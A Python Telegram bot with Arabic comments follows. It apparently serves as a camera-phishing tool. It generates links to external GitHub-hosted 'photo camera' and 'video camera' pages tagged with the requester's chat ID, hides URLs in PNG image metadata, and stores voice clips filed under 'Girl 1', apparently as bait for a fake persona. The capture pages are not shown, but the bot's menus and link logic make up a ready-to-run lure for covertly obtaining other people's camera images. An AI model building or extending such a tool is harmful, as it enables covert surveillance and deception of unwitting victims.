import telebot
from telebot import types
import json
import os
from PIL import Image, PngImagePlugin

# --- إعدادات البوت السرية ---
raw_token = os.getenv("BOT_TOKEN")
BOT_TOKEN = raw_token.strip() if raw_token else None

if not BOT_TOKEN:
    raise ValueError("❌ خطأ: لم يتم العثور على متغير BOT_TOKEN في إعدادات السيرفر!")

bot = telebot.TeleBot(BOT_TOKEN)
DB_FILE = "voice_db.json"

PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId/"

user_states = {}
user_data = {}

# --- إدارة قاعدة بيانات الأصوات ---
def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            try: 
                return json.load(f)
            except: 
                return {}
    return {}

def save_db(db):
    with open(DB_FILE, 'w', encoding='utf-8') as f: 
        json.dump(db, f, indent=4, ensure_ascii=False)

# --- دالة حقن الرابط في الصورة ---
def hide_link_in_metadata(image_path, link, output_path):
    img = Image.open(image_path).convert("RGB")
    meta = PngImagePlugin.PngInfo()
    meta.add_text("URL_LINK", link)
    img.save(output_path, "PNG", pnginfo=meta)

# --- واجهة البوت الرئيسية ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ طلب رابط كاميرا الصور", callback_data="get_photo_link"),
        types.InlineKeyboardButton("🎥 طلب رابط كاميرا الفيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("🔒 حقن رابط في صورة", callback_data="inject_start"),
        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
    )
    # تم تعديل نص الرسالة هنا بناءً على طلبك
    bot.send_message(message.chat.id, "المطور سيف الدين يرحب بك", reply_markup=markup)

# --- معالجة الأزرار والـ Callback ---
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    db = load_db()

    if call.data == "inject_start":
        user_states[chat_id] = "waiting_for_image_inject"
        bot.edit_message_text("أرسل الصورة الآن لحقن الرابط:", chat_id, call.message.message_id)
    
    elif call.data in ["get_photo_link", "get_video_link"]:
        link = f"{PHOTO_PAGE_URL}?chatId={chat_id}" if call.data == "get_photo_link" else f"{VIDEO_PAGE_URL}?chatId={chat_id}"
        bot.send_message(chat_id, f"🔗 الرابط المطلوب:\n{link}")
    
    # خطوة 1: عند الضغط على قسم الصوتيات يظهر زر "الفتاة 1"
    elif call.data == "voice_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("👩 الفتاة 1", callback_data="girl_1_menu"))
        markup.add(types.InlineKeyboardButton("🔙 عودة للقائمة الرئيسية", callback_data="main_menu"))
        bot.edit_message_text("اختر Mجلد المطلوب:", chat_id, call.message.message_id, reply_markup=markup)

    # خطوة 2: عند الضغط على "الفتاة 1" تظهر المقاطع العشرة كاملة (10 أزرار)
    elif call.data == "girl_1_menu":
        if not db:
            bot.answer_callback_query(call.id, "⚠️ لا توجد مقاطع محفوظة حالياً! أرسل البصمات للبوت ليحفظها تلقائياً.")
            return
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        
        # حلقة برمجية ثابتة ومحكمة لإنشاء 10 أزرار كاملة بالترتيب الصحيح
        for i in range(1, 11):
            name = f"مقطع {i}"
            if name in db:
                markup.add(types.InlineKeyboardButton(name, callback_data=f"play:{name}"))
                
        markup.add(types.InlineKeyboardButton("🔙 عودة", callback_data="voice_menu"))
        bot.edit_message_text("📂 مقاطع الفتاة 1 (10 مقاطع كامله):", chat_id, call.message.message_id, reply_markup=markup)
        
    elif call.data == "main_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("🖼️ طلب رابط كاميرا الصور", callback_data="get_photo_link"),
            types.InlineKeyboardButton("🎥 طلب رابط كاميرا الفيديو", callback_data="get_video_link"),
            types.InlineKeyboardButton("🔒 حقن رابط في صورة", callback_data="inject_start"),
            types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
        )
        # تم تعديل نص القائمة المعاد تشكيلها لتتطابق مع الرسالة الترحيبية الجديدة
        bot.edit_message_text("المطور سيف الدين يرحب بك", chat_id, call.message.message_id, reply_markup=markup)

    elif call.data.startswith("play:"):
        name = call.data.split(":")[1]
        file_id = db.get(name)
        if file_id:
            try: 
                bot.send_voice(chat_id, file_id)
            except Exception as e: 
                bot.answer_callback_query(call.id, f"❌ الـ ID الخاص بـ {name} منتهي! أعد إرساله للبوت لتحديثه.")
        else:
            bot.answer_callback_query(call.id, f"❌ {name} غير محفوظ بعد.")

# --- المعالج العام لاستلام الأصوات، الصور والنصوص ---
@bot.message_handler(content_types=['photo', 'text', 'voice'])
def handle_all(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)

    # استقبال وحفظ المقاطع بشكل تتابعي حاسم من 1 إلى 10
    if message.voice:
        db = load_db()
        
        # حساب الترقيم بشكل مباشر بناءً على عدد المقاطع المسجلة حالياً
        current_count = len(db)
        next_slot = current_count + 1
        
        # إذا تعدينا المقطع العاشر، نقوم بمسح القاعدة للبدء من جديد بشكل نظيف لمنع تداخل الأرقام
        if next_slot > 10:
            db = {}
            next_slot = 1
            
        name = f"مقطع {next_slot}"
        db[name] = message.voice.file_id
        save_db(db)
        bot.reply_to(message, f"✅ تم حفظ وتحديث الـ ID الخاص بـ ({name}) في مجلد الفتاة 1 بنجاح!")
    
    # معالجة الحقن (خطوة 1: استلام الصورة)
    elif state == "waiting_for_image_inject" and message.photo:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded = bot.download_file(file_info.file_path)
        img_path = f"img_{chat_id}.png"
        with open(img_path, 'wb') as f: f.write(downloaded)
        user_data[chat_id] = img_path
        user_states[chat_id] = "waiting_for_link"
        bot.reply_to(message, "تم حفظ الصورة، أرسل الرابط الآن:")

    # معالجة الحقن (خطوة 2: استلام الرابط)
    elif state == "waiting_for_link" and message.text:
        img_path = user_data.get(chat_id)
        out_path = f"out_{chat_id}.png"
        hide_link_in_metadata(img_path, message.text, out_path)
        with open(out_path, 'rb') as f:
            bot.send_photo(chat_id, f, caption=f"{message.text}")
        user_states[chat_id] = None
        if os.path.exists(img_path): os.remove(img_path)
        if os.path.exists(out_path): os.remove(out_path)

if __name__ == '__main__':
    bot.polling(none_stop=True, interval=0, timeout=20)
